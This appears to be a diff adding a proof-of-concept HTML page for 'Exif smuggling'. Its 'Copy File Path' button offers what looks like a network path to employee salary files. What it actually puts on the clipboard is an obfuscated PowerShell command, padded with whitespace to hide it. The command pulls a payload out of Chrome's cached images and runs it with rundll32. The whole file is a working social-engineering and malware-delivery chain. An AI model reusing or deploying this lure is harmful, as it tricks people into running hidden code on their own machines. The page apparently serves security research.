@@ -1,0 +1,44 @@
+<html>
+<head>
+<title>Exif Smuggling Test</title>
+<script>
+alert('Note: this PoC is only designed to work on Chrome.\n\nRunning the PowerShell command should pop up a "Hello World" message box.');
+
+var command = 'conhost.exe --headless powershell.exe -EncodedCommand JABvACAAPQAgACIAJABlAG4AdgA6AHQAZQBtAHAAXABlAHgAaQBmAF8AcwBtAHUAZwBnAGwAaQBuAGcAXAAiADsAIAAkAGMAIAA9ACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABHAG8AbwBnAGwAZQBcAEMAaAByAG8AbQBlAFwAVQBzAGUAcgAgAEQAYQB0AGEAXABEAGUAZgBhAHUAbAB0AFwAQwBhAGMAaABlAFwAQwBhAGMAaABlAF8ARABhAHQAYQBcACIAOwAgAG0AawBkAGkAcgAgAC0ARgBvAHIAYwBlACAAJABvACAAPgAgACQAbgB1AGwAbAA7ACAAYwBwACAAIgAkAGMAXAAqACIAIAAkAG8AOwAgAGcAYwBpACAAJABvACAAfAAlACAAewAgACQAZgAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAXwAuAEYAdQBsAGwATgBhAG0AZQApADsAIAAkAGQAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoARABlAGYAYQB1AGwAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABmACkAOwAgACQAbQAgAD0AIABbAHIAZQBnAGUAeABdADoAOgBNAGEAdABjAGgAKAAkAGQALAAgACIAKAA/AHMAKQAxADMAMwA3ADEAMwAzADcAKAAuACoAPwApADEAMwAzADcAMQAzADMANwAiACkAOwAgAGkAZgAgACgAJABtAC4AUwB1AGMAYwBlAHMAcwApACAAewAgACQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBEAGUAZgBhAHUAbAB0AC4ARwBlAHQAQgB5AHQAZQBzACgAJABtAC4ARwByAG8AdQBwAHMAWwAxAF0ALgBWAGEAbAB1AGUAKQA7ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAJABvAFwAbABvAGcAbwAuAGoAcABnACIALAAgACQAZQApADsAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgACIAJABvAFwAbABvAGcAbwAuAGoAcABnACIALAByAHUAbgA7ACAAYgByAGUAYQBrADsAIAB9ACAAfQA= -ExecutionPolicy                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        \\\\NetworkShare\\Finance\\Reports\\EmployeeSalaries.txt';
+
+async function WriteClipboard(text) {
+    // only works if website is served over HTTPS
+    if (navigator.clipboard && window.isSecureContext) {
+        await navigator.clipboard.writeText(text);
+        console.log('Copied with modern API');
+        return;
+    }
+  
+    // used only if site is using HTTPS (legacy method)
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+}
+
+function CopyPath() {
+    WriteClipboard(command);
+}
+</script>
+</head>
+<body>
+<div style="margin: 0 auto; width: 600px; text-align: center;">
+    <img src="logo.jpg" />
+    <div style="padding-top:100px;">
+        <p><h2>Here is the list of all employee salaries from accounting. Paste the file path into Windows Explorer to access.</p></h2>
+        <p><h3>If you're not authorized to access employee salaries, please close this window.</p></h3>
+        <p><input style="font-size:22px;" type="text" size="50" id="username" name="username" disabled value="\\NetworkShare\Finance\Reports\EmployeeSalaries.txt"/></p>
+        <p><button style="font-size:22px;" onClick="CopyPath()">Copy File Path</button></p>
+    </div>
+</div>
+</body>
+</html>
